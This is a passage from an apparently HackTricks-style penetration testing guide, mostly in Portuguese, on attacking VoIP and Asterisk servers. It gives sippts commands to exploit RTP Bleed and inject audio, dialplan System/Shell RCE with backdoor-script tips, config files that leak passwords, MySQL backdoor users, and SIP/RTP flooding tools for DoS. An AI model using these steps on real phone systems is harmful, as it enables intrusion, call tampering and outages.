```bash
sippts rtpbleed -i 10.10.0.10
```
* **`SIPPTS rtcpbleed`** do [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rtcpbleed detecta a vulnerabilidade RTP Bleed enviando fluxos RTCP.
```bash
sippts rtcpbleed -i 10.10.0.10
```
* **`SIPPTS rtpbleedflood`** do [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rtpbleedflood explora a vulnerabilidade RTP Bleed enviando streams RTP.
```bash
sippts rtpbleedflood -i 10.10.0.10 -p 10070 -v
```
* **`SIPPTS rtpbleedinject`** do [**sippts**](https://github.com/Pepelux/sippts)**:** O SIPPTS rtpbleedinject explora a vulnerabilidade RTP Bleed injetando um arquivo de √°udio (formato WAV).
```bash
sippts rtpbleedinject -i 10.10.0.10 -p 10070 -f audio.wav
```
### RCE

No Asterisk, se voc√™ conseguir **adicionar regras de extens√£o e recarreg√°-las** (por exemplo, comprometendo um servidor de gerenciador web vulner√°vel), √© poss√≠vel obter RCE usando o **`System`** command.
```scss
same => n,System(echo "Called at $(date)" >> /tmp/call_log.txt)
```
There is command called **`Shell`** that could be used **instead of `System`** to execute system commands if necessary.

{% hint style="warning" %}
If the server is **desallowing the use of certain characters** in the **`System`** command (like in Elastix), check if the web server allows to **create files somehow inside the system** (like in Elastix or trixbox), and use it to **create a backdoor script** and then use **`System`** to **execute** that **script**.
{% endhint %}

#### Arquivos locais interessantes e permiss√µes

* **`sip.conf`** -> Cont√©m a senha dos usu√°rios SIP.
* Se o **servidor Asterisk estiver rodando como root**, voc√™ pode comprometer o root.
* O **usu√°rio root do mysql** pode **n√£o ter nenhuma senha**.
* isso pode ser usado para criar um novo usu√°rio mysql como backdoor.
* **`FreePBX`**
* **`amportal.conf`** -> Cont√©m a senha do administrador do painel web (FreePBX).
* **`FreePBX.conf`** -> Cont√©m a senha do usu√°rio FreePBXuser usado para acessar o banco de dados.
* isso pode ser usado para criar um novo usu√°rio mysql como backdoor.
* **`Elastix`**
* **`Elastix.conf`** -> Cont√©m v√°rias senhas em texto claro, como a senha root do mysql, senha do IMAPd, senha do administrador web.
* **V√°rias pastas** pertencer√£o ao usu√°rio asterisk comprometido (se n√£o estiver rodando como root). Este usu√°rio pode ler os arquivos anteriores e tamb√©m controla a configura√ß√£o, ent√£o ele pode fazer o Asterisk carregar outros bin√°rios com backdoor quando executados.

### Inje√ß√£o RTP

√â poss√≠vel inserir um **`.wav`** em conversas usando ferramentas como **`rtpinsertsound`** (`sudo apt install rtpinsertsound`) e **`rtpmixsound`** (`sudo apt install rtpmixsound`).

Ou voc√™ pode usar os scripts de [http://blog.pepelux.org/2011/09/13/inyectando-trafico-rtp-en-una-conversacion-voip/](http://blog.pepelux.org/2011/09/13/inyectando-trafico-rtp-en-una-conversacion-voip/) para **escanear conversas** (**`rtpscan.pl`**), enviar um `.wav` para uma conversa (**`rtpsend.pl`**) e **inserir ru√≠do** em uma conversa (**`rtpflood.pl`**).

### DoS

Existem v√°rias maneiras de tentar alcan√ßar DoS em servidores VoIP.

* **`SIPPTS flood`** de [**sippts**](https://github.com/Pepelux/sippts)**: O SIPPTS flood envia mensagens ilimitadas para o alvo.
* `sippts flood -i 10.10.0.10 -m invite -v`
* **`SIPPTS ping`** de [**sippts**](https://github.com/Pepelux/sippts)**: O SIPPTS ping faz um ping SIP para ver o tempo de resposta do servidor.
* `sippts ping -i 10.10.0.10`
* [**IAXFlooder**](https://www.kali.org/tools/iaxflood/): DoS protocolo IAX usado pelo Asterisk.
* [**inviteflood**](https://github.com/foreni-packages/inviteflood/blob/master/inviteflood/Readme.txt): Uma ferramenta para realizar flooding de mensagens SIP/SDP INVITE sobre UDP/IP.
* [**rtpflood**](https://www.kali.org/tools/rtpflood/): Envia v√°rios pacotes RTP bem formados. √â necess√°rio saber as portas RTP que est√£o sendo usadas (sniff primeiro).
* [**SIPp**](https://github.com/SIPp/sipp): Permite analisar e gerar tr√°fego SIP, ent√£o tamb√©m pode ser usado para DoS.
* [**SIPsak**](https://github.com/nils-ohlmeier/sipsak): Canivete su√≠√ßo SIP. Tamb√©m pode ser usado para realizar ataques SIP.
* Fuzzers: [**protos-sip**](https://www.kali.org/tools/protos-sip/), [**voiper**](https://github.com/gremwell/voiper).

### Vulnerabilidades do SO

A maneira mais f√°cil de instalar um software como o Asterisk √© baixar uma **distribui√ß√£o de SO** que j√° o tenha instalado, como: **FreePBX, Elastix, Trixbox**... O problema com esses √© que, uma vez que est√° funcionando, os administradores de sistema podem **n√£o atualiz√°-los novamente** e **vulnerabilidades** ser√£o descobertas com o tempo.

## Refer√™ncias

* [https://github.com/Pepelux/sippts/wiki](https://github.com/Pepelux/sippts/wiki)
* [https://github.com/EnableSecurity/sipvicious](https://github.com/EnableSecurity/sipvicious)
* [http://blog.pepelux.org/](http://blog.pepelux.org/)
* [https://www.rtpbleed.com/](https://www.rtpbleed.com/)
* [https://medium.com/vartai-security/practical-voip-penetration-testing-a1791602e1b4](https://medium.com/vartai-security/practical-voip-penetration-testing-a1791602e1b4)
* [https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf](https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
